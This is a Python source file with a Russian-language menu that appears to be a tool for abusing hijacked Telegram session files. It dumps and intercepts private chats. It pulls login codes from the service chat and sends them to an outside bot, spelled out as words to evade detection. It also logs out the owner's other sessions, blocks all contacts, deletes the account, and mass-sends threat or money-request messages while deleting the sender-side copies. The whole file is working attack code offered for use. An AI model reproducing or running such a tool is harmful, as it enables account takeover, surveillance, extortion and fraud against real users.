import asyncio
import os
import re
from datetime import datetime

from colorama import Fore, init
from pystyle import Center, Colorate, Colors
from telethon import TelegramClient, events
from telethon.tl.functions.account import (
    DeleteAccountRequest,
    UpdateProfileRequest,
)
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.tl.functions.channels import CreateChannelRequest
from telethon.tl.functions.contacts import BlockRequest, GetContactsRequest
from telethon.tl.functions.messages import DeleteMessagesRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest

banner = """



╭──────────────────────────────────────────────────────────────────────────────────────────╮
│                                                                                          │
│       ▄█    █▄     ▄████████ ████████▄     ▄█   ▄█▄  ▄█   ▄█        ▄█                   │
│      ███    ███   ███    ███ ███   ▀███   ███ ▄███▀ ███  ███       ███                   │
│      ███    ███   ███    █▀  ███    ███   ███▐██▀   ███▌ ███       ███                   │
│      ███    ███  ▄███▄▄▄     ███    ███  ▄█████▀    ███▌ ███       ███                   │
│      ███    ███ ▀▀███▀▀▀     ███    ███ ▀▀█████▄    ███▌ ███       ███                   │
│      ███    ███   ███    █▄  ███    ███   ███▐██▄   ███  ███       ███                   │
│      ███    ███   ███    ███ ███   ▄███   ███ ▀███▄ ███  ███▌    ▄ ███▌    ▄             │
│       ▀██████▀    ██████████ ████████▀    ███   ▀█▀ █▀   █████▄▄██ █████▄▄██             │
│                                           ▀              ▀         ▀                     │
│                                                                                          │
│        [●] Для создания api id, hash создайте новое приложение на my.telegram.org/apps   │
│        [●] Сессии кидайте в папку где лежит этот скрипт                                  │
│                                                                                          │
│        [●] Сoder: @vedmoor                                                               │
│        [●] Для возврата напишите 99                                                      │
│                                                                                          │
╰──────────────────────────────────────────────────────────────────────────────────────────╯

"""
print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))


API_ID = int(input("Введите свой API ID: "))

if API_ID == 99:
    os.system("python main.py")


API_HASH = str(input("Введите свой API HASH: "))
bot_name = str(
    input(
        "Введите юзернейм бота в формате bot_name без собаки (нужно для получения кода для входа). Создайте бота в @LivegramBot: "
    )
)


init(autoreset=True)



def display_disclaimer():
    input("\nНажмите Enter для продолжения...")



def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")



def select_session():
    clear_screen()
    sessions = [f for f in os.listdir(".") if f.endswith(".session")]
    if not sessions:
        print("Нет доступных сессий.")
        input("Нажмите Enter для продолжения...")
        return None
    print("Доступные сессии:")
    for i, session in enumerate(sessions, 1):
        print(f"{i}. {session}")
    while True:
        try:
            choice = int(input("\nВведите номер сессии: "))
            if 1 <= choice <= len(sessions):
                return sessions[choice - 1]
            else:
                raise ValueError
        except ValueError:
            print("Некорректный ввод. Попробуйте снова.")
            input("Нажмите Enter для продолжения...")
            clear_screen()
            print("Доступные сессии:")
            for i, session in enumerate(sessions, 1):
                print(f"{i}. {session}")



async def check_session(session_file):
    try:
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()
            if await client.is_user_authorized():
                me = await client.get_me()
                print(
                    f"\nСессия рабочая! Юзернейм: @{me.username}, ID: {me.id}, Телефон: {me.phone}"
                )
            else:
                print("\nСессия не авторизована.")
    except Exception as e:
        print(f"\nОшибка при проверке сессии: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def save_conversation(session_file):
    try:
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()
            dialogs = await client.get_dialogs()
            for dialog in dialogs:
                if dialog.is_user:
                    entity = dialog.entity
                    messages = [
                        msg async for msg in client.iter_messages(entity, limit=1000000)
                    ]
                    output_folder = "conversations"
                    os.makedirs(output_folder, exist_ok=True)
                    filename = f"{output_folder}/{entity.username or entity.id}.txt"
                    with open(filename, "w", encoding="utf-8") as f:
                        for msg in messages:
                            sender = (
                                "Я" if msg.out else entity.first_name or "Собеседник"
                            )
                            f.write(f"{sender}: {msg.text}\n")
                    print(f"\nСохранена переписка с {entity.username or entity.id}")
    except Exception as e:
        print(f"\nОшибка при сохранении переписки: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def spam_user(session_file, username, message, delay=1):
    try:
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()
            if not await client.is_user_authorized():
                print("\nСессия не авторизована.")
                return

            entity = await client.get_entity(username)
            if not entity:
                print(f"\nПользователь {username} не найден.")
                return

            print(f"\nНачинаю спам пользователя {username}...")
            for i in range(100):
                try:
                    await client.send_message(entity, message)
                    print(f"Отправлено сообщение {i + 1}")
                    await asyncio.sleep(delay)
                except Exception as e:
                    print(f"\nОшибка отправки: {str(e)}")
                    break
            print("\nСпам завершен.")

    except Exception as e:
        print(f"\nОшибка при спаме: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def save_last_message_from_777000(session_file):
    try:
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()
            if not await client.is_user_authorized():
                print("\nСессия не авторизована.")
                return

            messages = [msg async for msg in client.iter_messages(777000, limit=1)]
            if not messages:
                print("\nВ чате 777000 нет сообщений.")
                return

            last_message = messages[0]
            if not last_message.text:
                print("\nПоследнее сообщение не содержит текста.")
                return

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_folder = "last_messages"
            os.makedirs(output_folder, exist_ok=True)
            filename = f"{output_folder}/message_{timestamp}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(last_message.text)
            print(f"\nСохранено полное сообщение в: {filename}")

    except Exception as e:
        print(f"\nОшибка при сохранении сообщения: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def send_code_to_bot(session_file):
    try:
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()
            if not await client.is_user_authorized():
                print("\nСессия не авторизована.")
                return

            messages = [msg async for msg in client.iter_messages(777000, limit=1)]
            if not messages:
                print("\nВ чате 777000 нет сообщений.")
                return

            last_message = messages[0]
            if not last_message.text:
                print("\nПоследнее сообщение не содержит текста.")
                return

            code_match = re.search(r"\b\d{5,6}\b", last_message.text)
            if not code_match:
                print("\nКод не найден в сообщении.")
                return

            code = code_match.group()

            
            digit_to_word = {
                "1": "один",
                "2": "два",
                "3": "три",
                "4": "четыре",
                "5": "пять",
                "6": "шесть",
                "7": "семь",
                "8": "восемь",
                "9": "девять",
                "0": "ноль",
            }
            word_code = " ".join([digit_to_word[digit] for digit in code])

            bot_entity = await client.get_entity(bot_name)
            if not bot_entity:
                print("\nБот для кода не найден.")
                return

            await client.send_message(bot_entity, "/start")
            print("\nОтправлена команда /start боту.")
            await client.send_message(bot_entity, word_code)
            print(f"\nОтправлен код: {word_code}")

    except Exception as e:
        print(f"\nОшибка при отправке кода: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def change_profile(session_file):
    try:
        first_name = input("Введите новое имя: ")
        last_name = input("Введите новую фамилию: ")
        photo_path = input("Введите путь к фото (оставьте пустым, чтобы пропустить): ")

        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()

            await client(
                UpdateProfileRequest(first_name=first_name, last_name=last_name)
            )
            print("\nИмя и фамилия успешно изменены.")

            if photo_path:
                if os.path.exists(photo_path):
                    await client(
                        UploadProfilePhotoRequest(
                            file=await client.upload_file(photo_path)
                        )
                    )
                    print("Фото профиля успешно изменено.")
                else:
                    print("Файл не найден.")
    except Exception as e:
        print(f"\nОшибка при изменении профиля: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def create_fake_channel(session_file):
    try:
        title = input("Введите название канала: ")
        description = input("Введите описание канала: ")

        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()

            await client(
                CreateChannelRequest(title=title, about=description, megagroup=False)
            )
            print(f"\nКанал создан: {title}")
    except Exception as e:
        print(f"\nОшибка при создании канала: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def block_all_contacts(session_file):
    try:
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()

            contacts = await client(GetContactsRequest(hash=0))
            if contacts.users:
                for user in contacts.users:
                    await client(BlockRequest(id=user.id))
                    print(f"\nЗаблокирован: {user.first_name}")
            else:
                print("\nКонтакты не найдены.")
    except Exception as e:
        print(f"\nОшибка при блокировке контактов: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def steal_sessions(session_file):
    try:
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()

            await client(ResetAuthorizationsRequest())
            print("\nВсе сессии, кроме текущей, завершены.")
    except Exception as e:
        print(f"\nОшибка при завершении сессий: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def mass_messaging(session_file):
    try:
        
        templates = {
            "угрозы": "threats.txt",
            "просьба денег": "money_request.txt",
            "реклама": "advertisement.txt",
        }

        
        available_templates = []
        for name, filename in templates.items():
            if os.path.exists(filename):
                available_templates.append((name, filename))

        if not available_templates:
            print("\nНет доступных шаблонов для рассылки!")
            print("Создайте файлы: threats.txt, money_request.txt, advertisement.txt и напишите текст для спама!")
            input("\nНажмите Enter для продолжения...")
            return

        
        print("\nДоступные шаблоны:")
        for i, (name, _) in enumerate(available_templates, 1):
            print(f"{i}. {name}")

        
        while True:
            try:
                choice = int(input("\nВыберите шаблон (номер): "))
                if 1 <= choice <= len(available_templates):
                    template_name, template_file = available_templates[choice - 1]
                    break
                else:
                    print("Неверный номер!")
            except ValueError:
                print("Введите число!")

        
        with open(template_file, "r", encoding="utf-8") as f:
            message_template = f.read()

        print(f"\nВыбран шаблон: {template_name}")
        print(f"Текст сообщения:\n{message_template}")

        
        confirm = input("\nПодтвердите рассылку (y/n): ").lower()
        if confirm != "y":
            print("Рассылка отменена")
            return

        
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()
            if not await client.is_user_authorized():
                print("\nСессия не авторизована.")
                return

            dialogs = await client.get_dialogs()
            sent_count = 0
            failed_count = 0

            for dialog in dialogs:
                if dialog.is_user:  
                    try:
                        
                        name = dialog.entity.first_name or "пользователь"
                        message = message_template.replace("{name}", name)

                        result = await client.send_message(dialog.entity, message)
                        message_id = result.id  

                        
                        await client(
                            DeleteMessagesRequest(id=[message_id], revoke=True)
                        )
                        print(f"Отправлено и удалено у себя: {dialog.name}")
                        sent_count += 1
                        await asyncio.sleep(1)  
                    except Exception as e:
                        print(f"Ошибка отправки/удаления {dialog.name}: {str(e)}")
                        failed_count += 1

            print("\nРассылка завершена!")
            print(f"Успешно отправлено: {sent_count}")
            print(f"Не удалось отправить: {failed_count}")

    except Exception as e:
        print(f"\nОшибка при массовой рассылке: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def delete_telegram_account(session_file):
    try:
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()
            if not await client.is_user_authorized():
                print("\nСессия не авторизована.")
                return

            confirm = input(
                f"{Fore.RED}\nВНИМАНИЕ! Это навсегда удалит аккаунт. Продолжить? (y/n): "
            )
            if confirm.lower() != "y":
                print("Отменено.")
                return

            print(f"{Fore.RED}\nУДАЛЕНИЕ АККАУНТА...")
            reason = "Deleted via script"
            await client(DeleteAccountRequest(reason=reason))
            print(f"{Fore.GREEN}Аккаунт удален навсегда.")

            if os.path.exists(session_file):
                os.remove(session_file)
                print("Файл сессии удален.")
    except Exception as e:
        print(f"\nОшибка: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def intercept_private_messages(session_file):
    try:
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()
            if not await client.is_user_authorized():
                print("\nСессия не авторизована.")
                return

            print(
                "\nПерехват сообщений (только личные чаты). Нажмите Ctrl+C для остановки."
            )

            @client.on(events.NewMessage(incoming=True))
            async def incoming_handler(event):
                if event.is_private:  
                    sender = await event.get_sender()
                    print("\nВходящее сообщение:")
                    print(f"  От: @{sender.username} (ID: {sender.id})")
                    print(f"  Текст: {event.message.message}")

            @client.on(events.NewMessage(outgoing=True))
            async def outgoing_handler(event):
                if event.is_private:  
                    try:
                        receiver = await client.get_entity(event.message.peer_id)
                        if hasattr(receiver, "username"):
                            target_info = f"@{receiver.username} (ID: {receiver.id})"
                        else:
                            target_info = f"ID: {receiver.id}"  
                    except Exception as e:
                        target_info = f"Не удалось определить (Ошибка: {e})"

                    print("\nИсходящее сообщение:")
                    print(f"  Кому: {target_info}")
                    print(f"  Текст: {event.message.message}")

            await (
                client.run_until_disconnected()
            )  

    except Exception as e:
        print(f"\nОшибка при перехвате сообщений: {str(e)}")
    print("\nПерехват сообщений остановлен.")
    input("\nНажмите Enter для продолжения...")
    clear_screen()



async def chat_with_user(session_file):
    try:
        async with TelegramClient(session_file, API_ID, API_HASH) as client:
            await client.start()
            if not await client.is_user_authorized():
                print("\nСессия не авторизована.")
                return

            username = input("Введите юзернейм пользователя для чата: ")
            try:
                entity = await client.get_entity(username)
            except Exception as e:
                print(f"\nНе удалось найти пользователя: {str(e)}")
                return

            print(f"\nНачат чат с @{entity.username} (ID: {entity.id}).")
            print("Введите сообщения для отправки. Введите 'exit' для выхода.")

            
            message_queue = asyncio.Queue()

            
            async def read_input():
                while True:
                    message = await asyncio.get_event_loop().run_in_executor(
                        None, input, "Ваше сообщение: "
                    )
                    await message_queue.put(message)
                    if message.lower() == "exit":
                        break

            
            asyncio.create_task(read_input())

            @client.on(events.NewMessage(from_users=entity))
            async def incoming_handler(event):
                print(f"\nСообщение от @{entity.username}: {event.message.message}")
                print(
                    "Ваше сообщение: ", end="", flush=True
                )  

            
            await client.start()

            
            while True:
                try:
                    message = (
                        message_queue.get_nowait()
                    )  
                    message_queue.task_done()

                    if message.lower() == "exit":
                        print("Выход из чата.")
                        break
                    try:
                        await client.send_message(entity, message)
                    except Exception as e:
                        print(f"Ошибка отправки сообщения: {str(e)}")
                        break
                except asyncio.QueueEmpty:
                    await asyncio.sleep(
                        0.1
                    )  
                except Exception as e:
                    print(f"Ошибка при обработке очереди сообщений: {str(e)}")
                    break
    except Exception as e:
        print(f"\nОшибка в чате с пользователем: {str(e)}")
    input("\nНажмите Enter для продолжения...")
    clear_screen()


def main():
    display_disclaimer()
    while True:
        clear_screen()
        print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
        print("1. Проверить сессию")
        print("2. Сохранить переписки")
        print("3. Запустить спам")
        print("4. Сохранить последний код")
        print("5. Сменить данные профиля")
        print("6. Отправить код")
        print("7. Создать канал")
        print("8. Заблокировать все контакты")
        print("9. Кикнуть сессии")
        print("10. Массовая рассылка")
        print("11. УДАЛИТЬ АККАУНТ")
        print("12. Перехват сообщений")
        print("13. Чат с пользователем") 
        print("14. Выход")

        try:
            action = int(input("\nВведите номер действия: "))
            if action == 14:
                break

            session = select_session()
            if not session:
                continue

            if action == 1:
                asyncio.run(check_session(session))
            elif action == 2:
                asyncio.run(save_conversation(session))
            elif action == 3:
                username = input("\nВведите юзернейм получателя: ")
                message = input("Введите текст сообщения: ")
                delay = int(input("Введите задержку между сообщениями (секунды): "))
                asyncio.run(spam_user(session, username, message, delay))
            elif action == 4:
                asyncio.run(save_last_message_from_777000(session))
            elif action == 5:
                asyncio.run(change_profile(session))
            elif action == 6:
                asyncio.run(send_code_to_bot(session))
            elif action == 7:
                asyncio.run(create_fake_channel(session))
            elif action == 8:
                asyncio.run(block_all_contacts(session))
            elif action == 9:
                asyncio.run(steal_sessions(session))
            elif action == 10:
                asyncio.run(mass_messaging(session))
            elif action == 11:
                asyncio.run(delete_telegram_account(session))
            elif action == 12:
                asyncio.run(intercept_private_messages(session))
            elif action == 13:  
                asyncio.run(chat_with_user(session))
            else:
                print("\nНекорректный выбор.")
                input("Нажмите Enter для продолжения...")
                clear_screen()

        except ValueError:
            print("\nНекорректный ввод. Попробуйте снова.")
            input("Нажмите Enter для продолжения...")
            clear_screen()


if __name__ == "__main__":
    main()
